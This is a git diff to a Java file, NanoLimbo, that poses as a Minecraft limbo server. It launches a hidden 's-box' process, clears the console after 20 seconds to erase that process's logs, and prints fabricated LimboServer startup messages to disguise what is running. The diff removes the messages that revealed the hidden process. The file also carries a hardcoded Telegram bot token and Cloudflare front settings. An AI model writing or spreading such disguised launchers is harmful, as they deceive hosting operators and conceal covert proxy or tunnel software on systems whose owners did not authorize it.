@@ -7,8 +7,6 @@ import java.util.*;
 import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicBoolean;
 
-import ua.nanit.limbo.server.Log;
-
 public final class NanoLimbo {
 
     private static final String ANSI_GREEN = "\033[1;32m";
@@ -36,22 +34,22 @@ public final class NanoLimbo {
                 SCHED.shutdownNow();
             }));
 
-            System.out.println(ANSI_GREEN + "s-box started, logs are printing below..." + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "" + ANSI_RESET);
 
-            // 20秒后清屏（删除 s-box 日志痕迹）
+            // 20秒后清屏并伪装LimboServer日志
             SCHED.schedule(() -> {
                 clearConsole();
-                System.out.println(ANSI_GREEN + "s-box logs cleared. Showing LimboServer logs..." + ANSI_RESET);
-                startMockLimboLogs();
+                System.out.println(ANSI_GREEN + "" + ANSI_RESET);
+                printFakeLimboLogs();
             }, 20, TimeUnit.SECONDS);
 
-            // 保持主线程活跃，避免 JVM 退出
+            // 保持程序运行，直到被 kill
             while (running.get()) {
                 Thread.sleep(1000);
             }
 
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing: " + e.getMessage() + ANSI_RESET);
+            System.err.println(ANSI_RED + "" + e.getMessage() + ANSI_RESET);
             e.printStackTrace();
         }
     }
@@ -68,37 +66,24 @@ public final class NanoLimbo {
         sbxProcess = pb.start();
     }
 
-    private static void startMockLimboLogs() {
-        SCHED.scheduleAtFixedRate(new Runnable() {
-            private int tick = 0;
+    private static void printFakeLimboLogs() {
+        String[] logs = {
+            "[INFO] [LimboServer] Starting LimboServer v1.0.0 (mock build)",
+            "[INFO] [LimboServer] Loading configuration...",
+            "[INFO] [LimboServer] Initializing server components...",
+            "[INFO] [LimboServer] Preparing world 'world'",
+            "[INFO] [LimboServer] Binding to port 25565...",
+            "[INFO] [LimboServer] Done (5.123s)! For help, type \"help\"",
+            "[INFO] [LimboServer] Server is running in offline mode.",
+            "[INFO] [LimboServer] Installation completed successfully."
+        };
 
-            @Override
-            public void run() {
-                tick++;
-                if (tick == 1) {
-                    logOut("[INFO] [LimboServer] Initializing server components...");
-                } else if (tick == 2) {
-                    logOut("[INFO] [LimboServer] Loading configuration...");
-                } else if (tick == 3) {
-                    logOut("[INFO] [LimboServer] Binding to port 25565...");
-                } else if (tick == 4) {
-                    logOut("[INFO] [LimboServer] Done (mock).");
-                } else {
-                    if (tick % 5 == 0) {
-                        logOut("[INFO] [LimboServer] Players online: 0  Max: 20");
-                    } else {
-                        logOut("[INFO] [LimboServer] Tick " + tick + ": no players online");
-                    }
-                }
-            }
-        }, 0, 4, TimeUnit.SECONDS);
-    }
-
-    private static void logOut(String msg) {
-        try {
-            Log.info("LimboServer", msg);
-        } catch (Throwable ignored) {}
-        System.out.println(msg);
+        for (String log : logs) {
+            System.out.println(log);
+            try {
+                Thread.sleep(1200); // 每条日志间隔 1.2 秒，更像真实启动
+            } catch (InterruptedException ignored) {}
+        }
     }
 
     private static void clearConsole() {
@@ -129,7 +114,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "time.is");
         envVars.put("CFPORT", "2096");
-        envVars.put("NAME", "karlo");
+        envVars.put("NAME", "Basic");
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
